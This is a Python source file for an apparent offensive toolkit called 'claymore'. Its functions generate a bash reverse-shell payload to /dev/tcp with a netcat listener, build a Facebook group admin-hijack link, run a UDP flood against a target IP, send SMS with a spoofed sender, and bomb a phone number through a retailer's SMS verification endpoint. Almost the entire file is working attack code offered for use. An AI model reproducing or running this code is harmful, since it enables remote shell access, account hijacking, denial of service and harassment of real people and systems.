## onlen.py - Main module of claymore
# -*- coding: utf-8 -*-
##
import os
import sys
import time
import socket
import random
import requests
from misc import *

netcatrat_banner = """
               _                  _                    _   
              ( )_               ( )_                 ( )_ 
  ___     __  | ,_)   ___    _ _ | ,_)    _ __    _ _ | ,_)
/' _ `\ /'__`\| |   /'___) /'_` )| |     ( '__) /'_` )| |  
| ( ) |(  ___/| |_ ( (___ ( (_| || |_    | |   ( (_| || |_ 
(_) (_)`\____)`\__)`\____)`\__,_)`\__)   (_)   `\__,_)`\__)
"""
facebookgrouphijack_banner = """
   ___  _             _                    _     
 /'___)( )           ( )                  ( )    
| (__  | |_      __  | |__     _ _    ___ | |/') 
| ,__) | '_`\  /'_ `\|  _ `\ /'_` ) /'___)| , <  
| |    | |_) )( (_) || | | |( (_| |( (___ | |\`\ 
(_)    (_,__/'`\__  |(_) (_)`\__,_)`\____)(_) (_)
              ( )_) |                            
               \___/'                            
"""
smsbomber_banner = """
                           _                        _                  
                          ( )                      ( )                 
  ___   ___ ___    ___    | |_      _     ___ ___  | |_      __   _ __ 
/',__)/' _ ` _ `\/',__)   | '_`\  /'_`\ /' _ ` _ `\| '_`\  /'__`\( '__)
\__, \| ( ) ( ) |\__, \   | |_) )( (_) )| ( ) ( ) || |_) )(  ___/| |   
(____/(_) (_) (_)(____/   (_,__/'`\___/'(_) (_) (_)(_,__/'`\____)(_)   
"""
smsspoofelk_banner = """
                                                        ___ 
                                                      /'___)
  ___   ___ ___    ___      ___  _ _      _      _   | (__  
/',__)/' _ ` _ `\/',__)   /',__)( '_`\  /'_`\  /'_`\ | ,__) 
\__, \| ( ) ( ) |\__, \   \__, \| (_) )( (_) )( (_) )| |    
(____/(_) (_) (_)(____/   (____/| ,__/'`\___/'`\___/'(_)    
                                | |                         
                                (_)                         
"""
denialofserviceattack_banner = """
     _                         _    _                  _     
    ( )                       ( )_ ( )_               ( )    
   _| |   _     ___       _ _ | ,_)| ,_)   _ _    ___ | |/') 
 /'_` | /'_`\ /',__)    /'_` )| |  | |   /'_` ) /'___)| , <  
( (_| |( (_) )\__, \   ( (_| || |_ | |_ ( (_| |( (___ | |\`\ 
`\__,_)`\___/'(____/   `\__,_)`\__)`\__)`\__,_)`\____)(_) (_)
"""

def netcat_rat():
	print netcatrat_banner
	nccheck = os.system("which nc")
	if nccheck != 0:
		print "[-] Netcat not installed yet!!!"
		backtomenu_option()
	else:
		netcatrat_menu()
		netcatrat = raw_input("claymore > ")
		if netcatrat.strip() in "01 1".split():
			host = raw_input("\nclaymore > set HOST ")
			port = raw_input("claymore > set PORT ")
			output = raw_input("claymore > set OUTPUT ")
			try:
				file = open(output, 'w')
				file.write("bash -i > /dev/tcp/%s/%s 0<&1 2>&1" % (host,port))
				file.close()
				slistener = raw_input("\nStart Listener? [y/N] ")
				if slistener.strip() in "y Y".split():
					port = raw_input("\nclaymore > set PORT ")
					print
					os.system("nc -l -p %s" %port)
					backtomenu_option()
				elif slistener.strip() in "n N".split():
					backtomenu_option()
				else:
					print
			except IOError, e:
				print "\nERROR:",e
				backtomenu_option()
		elif netcatrat.strip() in "02 2".split():
			port = raw_input("\nset PORT ")
			print
			os.system("nc -l -p %s" %port)
			backtomenu_option()
		else:
			print "\nERROR: Wrong Input"
			time.sleep(2)
			restart_program()

def facebookgroup_hijack():
	print facebookgrouphijack_banner
	id_group = raw_input("ID Group [ex: 589101351254979]: ")
	id_user = raw_input("ID User [ex: 100004136748473]: ")
	time.sleep(1.5)
	linkjack = 'https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange' % (id_group, id_user)
	print "[+] LINKJACK >>> https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (id_group, id_user)
	
	try:
		file = open("fbghack.txt", 'w')
		file.write(linkjack)
		file.close()
		print "[+] LinkJack saved as .txt file named fbghack.txt"
		backtomenu_option()
	except IOError, e:
		print "\nERROR:",e
		backtomenu_option()

def denialofservice_attack():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)
	print denialofserviceattack_banner
	ip = raw_input("claymore > target IP ")
	port = input("claymore > port ")
	print "\n[~] Start to Attacking...\n"
	time.sleep(2.5)
	sent = 0
	while True:
		sock.sendto(bytes, (ip,port))
		sent = sent + 1
		port = port + 1
		print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
		if port == 65534:
			port = 1

def sms_spoof_elk():
	print smsspoofelk_banner
	usernm = raw_input("Username: ")
	passwd = raw_input("Password: ")
	recipient = raw_input("To: ")
	sender = raw_input("From: ")
	messagetext = raw_input("Message: ")
	url = "https://api.46elks.com/a1/SMS"
	r = requests.post(url, data={'to': recipient,'from': sender,'message': messagetext}, auth=(usernm, passwd))
	print r.json()
	backtomenu_option()

def sms_bomber_jdid():
	print smsbomber_banner
	phone_number = raw_input("PHONE_NUMBER: ")
	countx = raw_input("COUNT: ")
	countx = int(countx)
	param = {'phone':''+phone_number,'smsType':'1'}
	count = 0
	while (count < countx):
		r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
		if '"success":true' in r.text:
			print("\n\033[1;32m[  OK  ] Send Succesful...Sleep for 1 second...\033[0m")
		else:
			print("\n\033[1;31m[FAILED] Send Failed...Sleep for 1 second...\033[0m")
		time.sleep(1)
		count = count + 1
	print("\033[1;33m[ DONE ] Stopped...\033[0m")
	backtomenu_option()
